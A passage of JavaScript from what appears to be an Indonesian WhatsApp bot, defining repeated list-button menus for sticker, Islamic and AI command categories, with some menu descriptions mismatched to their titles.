            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'stickermenubutton': {
let teks =`┏『 *\`乂 s ᴛ ɪ ᴄ ᴋ ᴇ ʀ 乂\`* 』━◧
║◦ *${prefix}goose*
║◦ *${prefix}woof*
║◦ *${prefix}smeme*
║◦ *${prefix}sticker*
║◦ *${prefix}brat*
║◦ *${prefix}bratvid*
║◦ *${prefix}8ball*
║◦ *${prefix}lizard*
║◦ *${prefix}meow*
║◦ *${prefix}gura*
║◦ *${prefix}doge*
║◦ *${prefix}patrick*
║◦ *${prefix}lovestick*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'databasemenubutton': {
let teks =`┏『 *\`乂 ɪ s ʟ ᴀ ᴍ ɪ - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}kisahnabi*
║◦ *${prefix}asmaulhusna*
║◦ *${prefix}bacaansholat*
║◦ *${prefix}audiosurah*
║◦ *${prefix}ayatkursi*
║◦ *${prefix}doaharian*
║◦ *${prefix}niatsholat*
║◦ *${prefix}quotesislami*
║◦ *${prefix}doatahlil*
║◦ *${prefix}tafsir*
║◦ *${prefix}jadwalsholat*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'aimenubutton': {
   let teks =`┏『 *\`乂 ᴏ ᴘ ᴇ ɴ - ᴀɪ 乂\`* 』━◧
║◦ *${prefix}leptonai*
║◦ *${prefix}openai*
║◦ *${prefix}ai*
║◦ *${prefix}hutaoai*
║◦ *${prefix}bard*
║◦ *${prefix}prodia*
║◦ *${prefix}diffusion-anime*
║◦ *${prefix}travel-assistant*
║◦ *${prefix}ocr*
║◦ *${prefix}guru-ai*
║◦ *${prefix}emi-ai*
║◦ *${prefix}claude-ai*
║◦ *${prefix}costume-ai*
║◦ *${prefix}herc-ai*
║◦ *${prefix}hercai-cartoon*
║◦ *${prefix}hercai-animefy*
║◦ *${prefix}hercai-lexica*
║◦ *${prefix}hercai-prodia*
║◦ *${prefix}hercai-simurg*
║◦ *${prefix}hercai-raava*
║◦ *${prefix}hercai-shonin*
║◦ *${prefix}realistic*
║◦ *${prefix}3dmodel*
║◦ *${prefix}jadizombie*
║◦ *${prefix}blackboxai*
║◦ *${prefix}photoleapai*
║◦ *${prefix}diffusion*
║◦ *${prefix}indo-ai*
║◦ *${prefix}lamaai*
║◦ *${prefix}aivo*
║◦ *${prefix}gemini*
║◦ *${prefix}text2img*
║◦ *${prefix}absolutely*
║◦ *${prefix}dalle*
║◦ *${prefix}bingimg*
║◦ *${prefix}bingai*
║◦ *${prefix}gptimg*
║◦ *${prefix}gpt4*
║◦ *${prefix}gpt4_2*
║◦ *${prefix}anything*
║◦ *${prefix}hdvid*
║◦ *${prefix}cai*
║◦ *${prefix}youai*
║◦ *${prefix}remini*
║◦ *${prefix}jadianime*
║◦ *${prefix}removebg*
║◦ *${prefix}nulis*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
